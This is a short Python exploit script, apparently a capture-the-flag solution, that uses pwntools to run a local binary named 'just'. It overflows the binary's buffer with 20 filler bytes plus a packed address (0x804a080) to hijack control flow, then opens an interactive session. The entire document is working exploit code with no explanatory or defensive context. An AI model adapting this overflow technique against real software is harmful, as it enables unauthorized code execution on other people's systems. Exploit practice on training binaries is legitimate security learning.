import pwn
import struct

io = pwn.process("./just")
payload = b"\x55" * 20 + struct.pack("I", 0x804a080)
io.sendline(payload)
io.interactive()


